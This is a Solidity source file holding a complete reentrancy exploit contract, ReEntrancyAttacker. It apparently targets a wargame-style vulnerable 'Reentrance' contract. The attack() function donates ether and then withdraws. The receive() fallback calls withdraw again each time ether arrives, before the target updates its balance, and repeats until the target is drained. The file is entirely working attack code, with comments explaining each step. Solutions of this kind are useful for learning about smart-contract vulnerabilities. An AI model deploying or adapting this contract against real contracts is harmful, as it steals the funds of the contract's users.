pragma solidity ^0.8.21;

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint balance);

    function withdraw(uint _amount) external;
}

contract ReEntrancyAttacker {
    IReentrance public reentrancyContract;

    constructor(address _reentrancyAddress) {
        reentrancyContract = IReentrance(_reentrancyAddress);
    }

    function withdraw() internal {
        uint challengeRemainingBalance = address(reentrancyContract).balance;
        if (challengeRemainingBalance > 0) {
            uint balance = reentrancyContract.balanceOf(address(this));
            uint withdrawAmount = balance < challengeRemainingBalance
                ? balance
                : challengeRemainingBalance;
            reentrancyContract.withdraw(withdrawAmount);
        }
    }

    function attack() external payable {
        require(msg.value >= 0.1 ether, "Need more ether please!");
        // donate balance so that we can withdraw
        reentrancyContract.donate{value: msg.value}(address(this));
        // execute withdrawal
        withdraw();
        // the fallback function will be executed as ETH is sent in and should execute reentrancy attack
    }

    receive() external payable {
        // re-entrancy attack
        // execute withdrawal again as ETH is received and before our balance in reentrancyContract is updated
        withdraw();
    }
}
